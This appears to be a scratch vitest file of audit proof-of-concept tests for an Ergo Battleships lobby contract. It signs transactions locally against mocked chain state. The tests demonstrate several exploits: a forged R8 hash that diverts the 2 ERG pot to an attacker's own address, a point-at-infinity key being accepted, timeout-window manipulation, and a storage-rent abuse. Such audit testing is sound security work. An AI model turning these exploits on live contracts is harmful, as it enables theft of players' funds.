// PASS 2 verification PoCs for contracts/lobby.es (scratch file; delete after audit).
import { describe, it, expect } from 'vitest';
import * as wasm from 'ergo-lib-wasm-nodejs';
import {
  getLobbyErgoTree,
  getBattleshipsErgoTree,
  getBattleshipsAddress,
  normalizeInputBox,
  DEFAULT_DEV_PK,
} from '../src/lib/blockchain/fleet';
import { generateBoardCommitment, hashBlake2b256 } from '../src/lib/crypto/merkle';
import { ErgoAddress, OutputBuilder, TransactionBuilder, SColl, SGroupElement, SByte, SInt } from '@fleet-sdk/core';
import { serializeBox } from '@fleet-sdk/serializer';
import { hexToBytes, bytesToHex } from '@noble/hashes/utils.js';

const HOST_PK = '0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798';
const attackerSecret = wasm.SecretKey.dlog_from_bytes(hexToBytes('33'.repeat(32)));
const attackerAddr = ErgoAddress.fromBase58(attackerSecret.get_address().to_base58(wasm.NetworkPrefix.Mainnet));
const ATTACKER_PK = bytesToHex(attackerAddr.getPublicKeys()[0]);
const H = 1250000;

function stateCtx(height: number) {
  const headersJson: any[] = [];
  for (let i = 0; i < 10; i++) {
    headersJson.push({
      extensionId: '00'.repeat(32), difficulty: '1', votes: '000000', timestamp: Date.now() - i * 120000, size: 1000,
      stateRoot: '00'.repeat(33), height: height - i, nBits: 100000, version: 2,
      id: (i + 1).toString(16).padStart(64, '0'), adProofsRoot: '00'.repeat(32), transactionsRoot: '00'.repeat(32),
      extensionHash: '00'.repeat(32), parentId: (i + 2).toString(16).padStart(64, '0'),
      powSolutions: { pk: HOST_PK, w: HOST_PK, n: '0000000000000000', d: 0 },
    });
  }
  const bh = wasm.BlockHeaders.from_json(headersJson);
  return new wasm.ErgoStateContext(wasm.PreHeader.from_block_header(bh.get(0)), bh, wasm.Parameters.default_parameters());
}

function reduceAndSign(unsignedTx: any, inputBoxes: any[], height: number) {
  const s = (o: any) => JSON.stringify(o, (_, v) => (typeof v === 'bigint' ? v.toString() : v));
  const utx = wasm.UnsignedTransaction.from_json(s(unsignedTx.toPlainObject()));
  const boxes = wasm.ErgoBoxes.empty();
  for (const b of inputBoxes) boxes.add(wasm.ErgoBox.from_json(s(b)));
  const reduced = wasm.ReducedTransaction.from_unsigned_tx(utx, boxes, wasm.ErgoBoxes.empty(), stateCtx(height));
  const secrets = new wasm.SecretKeys();
  secrets.add(attackerSecret);
  return wasm.Wallet.from_secrets(secrets).sign_reduced_transaction(reduced);
}

function mkLobby(com: any, value: string, r8Hex: string) {
  const box: any = {
    boxId: '00'.repeat(32), value, ergoTree: getLobbyErgoTree().toHex(), assets: [], creationHeight: H,
    additionalRegisters: {
      R4: SColl(SGroupElement, [HOST_PK, DEFAULT_DEV_PK]).toHex(),
      R5: SColl(SColl(SByte), [Array.from(hexToBytes(com.rootHex)), Array.from(hexToBytes(com.boardHashHex))]).toHex(),
      R6: SColl(SInt, []).toHex(),
      R7: SColl(SByte, []).toHex(),
      R8: r8Hex,
      R9: SInt(30).toHex(),
    },
    transactionId: '44'.repeat(32), index: 0,
  };
  box.boxId = bytesToHex(hashBlake2b256(serializeBox(box).toBytes()));
  return box;
}

const gameHashR8 = SColl(SByte, Array.from(hashBlake2b256(hexToBytes(getBattleshipsErgoTree().toHex())))).toHex();

function feeBox(value = '10000000') {
  const b: any = { boxId: '00'.repeat(32), value, ergoTree: attackerAddr.ergoTree, assets: [], creationHeight: H, additionalRegisters: {}, transactionId: '22'.repeat(32), index: 0 };
  b.boxId = bytesToHex(hashBlake2b256(serializeBox(b).toBytes()));
  return b;
}

function fleetGrid() {
  const grid = new Array(64).fill(0);
  [0, 1, 2, 3, 4, 16, 17, 18, 40, 41].forEach((i) => (grid[i] = 1));
  return grid;
}

function gameRegisters(hostCom: any, chalCom: any, timeoutHeight: number, r4Hex?: string) {
  return {
    R4: r4Hex || SColl(SGroupElement, [HOST_PK, ATTACKER_PK, DEFAULT_DEV_PK]).toHex(),
    R5: SColl(SColl(SByte), [
      Array.from(hexToBytes(hostCom.rootHex)),
      Array.from(hexToBytes(chalCom.rootHex)),
      Array.from(hexToBytes(hostCom.boardHashHex)),
      Array.from(hexToBytes(chalCom.boardHashHex)),
    ]).toHex(),
    R6: SColl(SInt, [0, 0, 0]).toHex(),
    R7: SColl(SInt, []).toHex(),
    R8: SColl(SColl(SByte), [Array(64).fill(0), Array(64).fill(0)]).toHex(),
    R9: SColl(SInt, [timeoutHeight, 30]).toHex(),
  };
}

// Build an accept tx: single lobby (1 ERG) + attacker funding (1 ERG + fee) -> 2 ERG output box.
function acceptTx(lobby: any, outAddressOrTree: string, regs: any) {
  const out = new OutputBuilder(2000000000n, outAddressOrTree).setAdditionalRegisters(regs);
  const ext = { 0: SByte(1).toHex() };
  const fb = feeBox('1100000000'); // 1.1 ERG: challenger funds the second half honestly
  const tx = new TransactionBuilder(H + 1)
    .from([{ ...normalizeInputBox(lobby), extension: ext } as any, normalizeInputBox(fb)])
    .to(out)
    .sendChangeTo(attackerAddr.encode())
    .payFee(1100000n)
    .build();
  return { tx, inputs: [normalizeInputBox(lobby), fb] };
}

describe('PASS2 lobby verification', () => {
  // ---- L-01: forged R8 lets the pot land under an arbitrary script (here the attacker's own P2PK)
  it('L-01: accept succeeds with OUTPUTS(0) guarded by the attacker P2PK when R8 = blake2b256(that tree)', () => {
    const hostCom = generateBoardCommitment(fleetGrid());
    const chalCom = generateBoardCommitment(fleetGrid());
    const forgedR8 = SColl(SByte, Array.from(hashBlake2b256(hexToBytes(attackerAddr.ergoTree)))).toHex();
    const lobby = mkLobby(hostCom, '1000000000', forgedR8);
    const { tx, inputs } = acceptTx(lobby, attackerAddr.encode(), gameRegisters(hostCom, chalCom, H + 1 + 30));
    const signed = reduceAndSign(tx, inputs, H + 1);
    expect(signed.outputs().get(0).value().as_i64().to_str()).toBe('2000000000');
    expect(signed.outputs().get(0).ergo_tree().to_base16_bytes()).toBe(attackerAddr.ergoTree);
  });

  it('L-01 control: the same output box under the real game tree also passes (rules 1-7 identical)', () => {
    const hostCom = generateBoardCommitment(fleetGrid());
    const chalCom = generateBoardCommitment(fleetGrid());
    const lobby = mkLobby(hostCom, '1000000000', gameHashR8);
    const { tx, inputs } = acceptTx(lobby, getBattleshipsAddress(), gameRegisters(hostCom, chalCom, H + 1 + 30));
    expect(() => reduceAndSign(tx, inputs, H + 1)).not.toThrow();
  });

  // ---- L-03: how far can the challenger pull the host's first-move deadline forward?
  it('L-03: floor of the timeout window is exactly HEIGHT + tb - 10 (and one block lower is rejected)', () => {
    const hostCom = generateBoardCommitment(fleetGrid());
    const chalCom = generateBoardCommitment(fleetGrid());
    const lobby = mkLobby(hostCom, '1000000000', gameHashR8);
    // HEIGHT at reduction = H + 1, tb = 30 -> floor = H + 21
    const ok = acceptTx(lobby, getBattleshipsAddress(), gameRegisters(hostCom, chalCom, H + 21));
    expect(() => reduceAndSign(ok.tx, ok.inputs, H + 1)).not.toThrow();
    const bad = acceptTx(lobby, getBattleshipsAddress(), gameRegisters(hostCom, chalCom, H + 20));
    expect(() => reduceAndSign(bad.tx, bad.inputs, H + 1)).toThrow(/reduced to false/i);
  });

  // ---- HEIGHT / mempool re-validation of an accept that sits in the mempool
  it('HEIGHT: an accept built for H+1 stays valid for ~10 blocks of mempool delay then becomes permanently invalid', () => {
    const hostCom = generateBoardCommitment(fleetGrid());
    const chalCom = generateBoardCommitment(fleetGrid());
    const lobby = mkLobby(hostCom, '1000000000', gameHashR8);
    // client value: currentHeight + 1 + tb  with currentHeight = H
    const built = acceptTx(lobby, getBattleshipsAddress(), gameRegisters(hostCom, chalCom, H + 1 + 30));
    expect(() => reduceAndSign(built.tx, built.inputs, H + 1)).not.toThrow();   // included immediately
    expect(() => reduceAndSign(built.tx, built.inputs, H + 11)).not.toThrow();  // 10 blocks late: still fine
    expect(() => reduceAndSign(built.tx, built.inputs, H + 12)).toThrow(/reduced to false/i); // evicted
  });

  // ---- L-07: point at infinity in R4(1) of the game box
  it('L-07: OUTPUTS(0).R4(1) = point at infinity (33 zero bytes) is accepted by the lobby', () => {
    const hostCom = generateBoardCommitment(fleetGrid());
    const chalCom = generateBoardCommitment(fleetGrid());
    const lobby = mkLobby(hostCom, '1000000000', gameHashR8);
    // hand-built Coll[GroupElement] of size 3: 0x13 (Coll[GroupElement]) 0x03 (len) + 3 * 33 bytes
    const infinityR4 = '1303' + HOST_PK + '00'.repeat(33) + DEFAULT_DEV_PK;
    const { tx, inputs } = acceptTx(lobby, getBattleshipsAddress(), gameRegisters(hostCom, chalCom, H + 1 + 30, infinityR4));
    const signed = reduceAndSign(tx, inputs, H + 1);
    expect(signed.outputs().get(0).value().as_i64().to_str()).toBe('2000000000');
  });
});

describe('PASS2 creation height / storage rent', () => {
  it('VF: lobby accepts a game box whose creationHeight is 0, and the box is large enough that storage rent exceeds a 2 ERG pot', () => {
    const hostCom = generateBoardCommitment(fleetGrid());
    const chalCom = generateBoardCommitment(fleetGrid());
    const lobby = mkLobby(hostCom, '1000000000', gameHashR8);
    const regs = gameRegisters(hostCom, chalCom, H + 1 + 30);
    const out = new OutputBuilder(2000000000n, getBattleshipsAddress())
      .setAdditionalRegisters(regs)
      .setCreationHeight(0, { replace: true });
    const ext = { 0: SByte(1).toHex() };
    const fb = feeBox('1100000000');
    const tx = new TransactionBuilder(H + 1)
      .from([{ ...normalizeInputBox(lobby), extension: ext } as any, normalizeInputBox(fb)])
      .to(out)
      .sendChangeTo(attackerAddr.encode())
      .payFee(1100000n)
      .build();
    const signed = reduceAndSign(tx, [normalizeInputBox(lobby), fb], H + 1);
    const o0 = signed.outputs().get(0);
    console.log('game box creationHeight in signed tx:', o0.creation_height());
    const sizeBytes = o0.sigma_serialize_bytes().length;
    console.log('game box size (bytes):', sizeBytes, '-> storage rent =', (sizeBytes * 1250000) / 1e9, 'ERG');
    expect(o0.creation_height()).toBe(0);
  });
});
